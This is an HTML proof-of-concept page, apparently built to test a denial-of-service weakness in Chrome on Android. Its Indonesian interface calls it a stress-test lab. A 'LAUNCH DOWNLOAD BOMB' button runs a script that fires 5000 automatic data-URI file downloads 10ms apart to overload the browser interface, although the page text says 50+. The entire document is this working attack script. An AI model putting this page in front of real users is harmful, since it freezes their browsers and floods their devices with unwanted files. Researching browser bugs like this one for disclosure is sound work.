<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chrome Android DOS Test - PoC 2</title>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background: #121212; color: #eee; }
        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; border: 1px solid #333; }
        .btn-stress {
            background: #d93025; color: white; padding: 20px;
            border: none; border-radius: 10px; font-weight: bold;
            width: 100%; font-size: 1.1rem; cursor: pointer;
        }
        .status { margin-top: 20px; font-family: monospace; color: #0f0; }
    </style>
</head>
<body>

    <div class="card">
        <h1>⚠️ Stress Test Lab</h1>
        <p>Memicu 50+ download dengan jeda 10ms.<br>Perhatikan responsivitas navigasi Chrome.</p>
        
        <button class="btn-stress" onclick="startStressTest()">
            LAUNCH DOWNLOAD BOMB
        </button>

        <div id="log" class="status">Status: Ready</div>
    </div>

    <script>
        function startStressTest() {
            const logDiv = document.getElementById('log');
            const totalFiles = 5000; // Jumlah file untuk mencoba overload UI
            
            logDiv.innerText = "Status: Launching...";

            for (let i = 1; i <= totalFiles; i++) {
                setTimeout(() => {
                    const link = document.createElement('a');
                    
                    // Menggunakan data unik tiap iterasi agar tidak dianggap file yang sama
                    const content = `Stress Test File Ke-${i} - Time: ${Date.now()}`;
                    link.href = "data:application/octet-stream;base64," + btoa(content);
                    link.download = `attack_log_${i}.bin`;
                    
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);

                    logDiv.innerText = `Status: Sent ${i}/${totalFiles}`;
                    
                    if (i === totalFiles) {
                        logDiv.innerText = "Status: All triggers sent. Check UI Response.";
                    }
                }, i * 10); // Jeda 10ms (Sangat Cepat)
            }
        }
    </script>

</body>
</html>
